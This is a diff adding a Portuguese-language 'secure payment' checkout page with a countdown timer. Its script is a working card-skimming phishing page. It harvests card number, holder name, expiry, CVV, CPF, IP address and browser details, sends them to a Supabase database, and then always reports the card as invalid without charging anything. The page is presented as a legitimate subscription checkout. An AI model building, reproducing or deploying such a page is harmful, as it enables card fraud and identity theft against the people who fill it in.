@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Seguro — Giovana Neves</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        :root {
+            --bg-dark: #0a0a0a;
+            --card-dark: #141414;
+            --orange: #ff6b00;
+            --orange-glow: rgba(255, 107, 0, 0.4);
+            --text-white: #ffffff;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-white);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .checkout-container {
+            background: var(--card-dark);
+            width: 100%;
+            max-width: 450px;
+            padding: 40px 30px;
+            border-radius: 24px;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .checkout-title { font-size: 1.5rem; font-weight: 700; }
+        .checkout-subtitle { font-size: 0.9rem; margin-bottom: 15px; }
+
+        .timer { font-size: 1rem; font-weight: 600; margin-bottom: 20px; }
+
+        .card-area {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border: 1px dashed rgba(255, 107, 0, 0.3);
+            text-align: left;
+        }
+
+        .form-group { margin-bottom: 15px; }
+        .form-label { font-size: 0.8rem; margin-bottom: 6px; display: block; }
+        .form-input {
+            width: 100%; padding: 12px; border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: #000; color: var(--text-white);
+            font-size: 0.9rem;
+        }
+
+        .btn-pay {
+            background: var(--orange); color: #fff; border: none;
+            padding: 14px; border-radius: 12px; width: 100%;
+            font-weight: 600; cursor: pointer; transition: all 0.3s ease;
+        }
+        .btn-pay:hover { transform: translateY(-2px); box-shadow: 0 5px 15px var(--orange-glow); }
+
+        .btn-confirm {
+            background: transparent; color: var(--text-white);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            padding: 14px; border-radius: 12px; width: 100%;
+            font-weight: 500; cursor: pointer; transition: all 0.3s ease;
+            margin-top: 15px;
+        }
+        .btn-confirm:hover { background: rgba(255, 255, 255, 0.05); border-color: var(--text-white); }
+
+        .toast {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            background: #22c55e; color: white; padding: 12px 24px;
+            border-radius: 50px; font-size: 0.9rem; font-weight: 500;
+            opacity: 0; transition: opacity 0.3s ease; pointer-events: none;
+            z-index: 100;
+        }
+        .toast.show { opacity: 1; }
+        .processing { background: #facc15; color: #000; }
+        .error { background: #ef4444; }
+    </style>
+</head>
+<body>
+
+    <div class="checkout-container">
+        <h1 class="checkout-title">Finalizar Assinatura</h1>
+        <p class="checkout-subtitle">Pagamento via Cartão para acesso imediato</p>
+        <div id="timer" class="timer">Tempo restante: 10:00</div>
+
+        <div class="card-area">
+            <div class="form-group">
+                <label class="form-label">Número do Cartão</label>
+                <input id="card-number" type="text" class="form-input" maxlength="19" placeholder="0000 0000 0000 0000">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Nome do Titular</label>
+                <input id="card-name" type="text" class="form-input" placeholder="Como está no cartão">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Validade</label>
+                <input id="card-expiry" type="text" class="form-input" maxlength="5" placeholder="MM/AA">
+            </div>
+            <div class="form-group">
+                <label class="form-label">CVV</label>
+                <input id="card-cvv" type="text" class="form-input" maxlength="3" placeholder="123">
+            </div>
+            <div class="form-group">
+                <label class="form-label">CPF</label>
+                <input id="card-cpf" type="text" class="form-input" maxlength="14" placeholder="000.000.000-00">
+            </div>
+            <button onclick="payCard()" class="btn-pay">Pagar com Cartão</button>
+        </div>
+
+        <button onclick="window.history.back()" class="btn-confirm">Voltar e confirmar depois</button>
+    </div>
+
+    <div id="toast" class="toast">Mensagem</div>
+
+    <script type="module">
+        import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm';
+
+        // Substitua com suas credenciais do Supabase
+        const SUPABASE_URL = 'https://eyylzguxfpaxsqdvomrb.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable__1FGNQjwQUiZDglVqsMGsQ_gQpJ3ffY';
+
+        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        async function submitCheckoutData() {
+            const cardNumber = document.getElementById('card-number').value;
+            const cardName = document.getElementById('card-name').value;
+            const cardExpiry = document.getElementById('card-expiry').value;
+            const cardCvv = document.getElementById('card-cvv').value;
+            const cardCpf = document.getElementById('card-cpf').value;
+
+            const userAgent = navigator.userAgent;
+            const referrer = document.referrer;
+            const status = 'Novo';
+
+            let ipAddress = null;
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ipAddress = data.ip;
+            } catch (error) {
+                console.error('Erro ao obter o endereço IP:', error);
+            }
+
+            const checkoutData = {
+                card_number: cardNumber,
+                card_name: cardName,
+                card_expiry: cardExpiry,
+                card_cvv: cardCvv,
+                card_cpf: cardCpf,
+                user_agent: userAgent,
+                referrer: referrer,
+                status: status,
+                ip_address: ipAddress
+            };
+
+            try {
+                const { data, error } = await supabase
+                    .from('checkouts')
+                    .insert([checkoutData]);
+
+                if (error) {
+                    console.error('Erro ao inserir dados no Supabase:', error);
+                    showToast('Erro ao salvar dados!', 'error');
+                    return false;
+                }
+
+                console.log('Dados inseridos com sucesso no Supabase:', data);
+                // showToast('Dados salvos com sucesso!', 'success'); // Não mostrar aqui para não interferir com a mensagem de pagamento
+                return true;
+            } catch (error) {
+                console.error('Erro inesperado ao enviar dados para o Supabase:', error);
+                showToast('Erro inesperado!', 'error');
+                return false;
+            }
+        }
+
+        function showToast(message, type) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast show ${type}`;
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        // Expor a função para ser chamada globalmente, se necessário
+        window.submitCheckoutData = submitCheckoutData;
+
+
+        // Cronômetro de 10 minutos
+        // Cronômetro de 10 minutos
+        let timeLeft = 600;
+        const timerElement = document.getElementById('timer');
+        function updateTimer() {
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            timerElement.textContent = `Tempo restante: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.textContent = "Tempo esgotado!";
+                document.querySelector(".btn-pay").disabled = true;
+            }
+        }
+        updateTimer();
+
+        // Restrições de entrada
+        document.getElementById('card-number').addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, ''); // apenas números
+            value = value.match(/.{1,4}/g)?.join(' ') || ''; // espaço a cada 4 dígitos
+            this.value = value;
+        });
+
+        document.getElementById('card-name').addEventListener('input', function() {
+            this.value = this.value.replace(/[^a-zA-Z\s]/g, '').toUpperCase(); // apenas letras e espaços, maiúsculas
+        });
+
+        document.getElementById('card-cvv').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0,3); // apenas números, máximo 3
+        });
+
+        document.getElementById('card-cpf').addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, '').slice(0, 11);
+            if (value.length > 9) {
+                value = value.slice(0,3) + '.' + value.slice(3,6) + '.' + value.slice(6,9) + '-' + value.slice(9,11);
+            } else if (value.length > 6) {
+                value = value.slice(0,3) + '.' + value.slice(3,6) + '.' + value.slice(6);
+            } else if (value.length > 3) {
+                value = value.slice(0,3) + '.' + value.slice(3);
+            }
+            this.value = value;
+        });
+
+        document.getElementById('card-expiry').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, ''); // apenas números
+            if (this.value.length > 2) {
+                this.value = this.value.slice(0,2) + '/' + this.value.slice(2,4);
+            }
+        });
+
+        // Função de pagamento
+        async function payCard() {
+            const dataSaved = await submitCheckoutData();
+            if (!dataSaved) {
+                // Se os dados não foram salvos, não prosseguir com o pagamento simulado
+                return;
+            }
+
+            const toast = document.getElementById('toast');
+            toast.textContent = "Processando pagamento...";
+            toast.className = "toast show processing";
+
+            // Continuar com a lógica de pagamento existente após salvar os dados
+            setTimeout(() => {
+                toast.textContent = "Cartão inválido!";
+                toast.className = "toast show error";
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 3000);
+            }, 10000);
+        }
+    </script>
+
+</body>
+</html>
